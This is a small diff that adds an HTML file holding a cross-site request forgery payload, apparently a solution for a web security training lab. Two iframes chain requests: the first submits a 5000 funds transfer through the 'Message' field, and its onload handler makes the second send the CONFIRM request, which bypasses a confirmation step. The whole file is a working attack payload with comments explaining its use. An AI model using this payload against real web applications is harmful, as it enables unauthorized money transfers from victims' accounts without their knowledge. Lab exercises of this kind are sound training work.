@@ -1,0 +1,8 @@
+<!-- Field exploitable: Message -->
+<!-- First iframe will set the src of second iframe, making second request happends right
+after the first request -->
+<!-- payload -->
+<iframe src="attack?Screen=1471017872&menu=900&transferFunds=5000"
+onload="document.getElementById('Second').src='attack?Screen=1471017872&menu=900&transferFunds=CONFIRM';">
+</iframe>
+<iframe id="Second"></iframe>
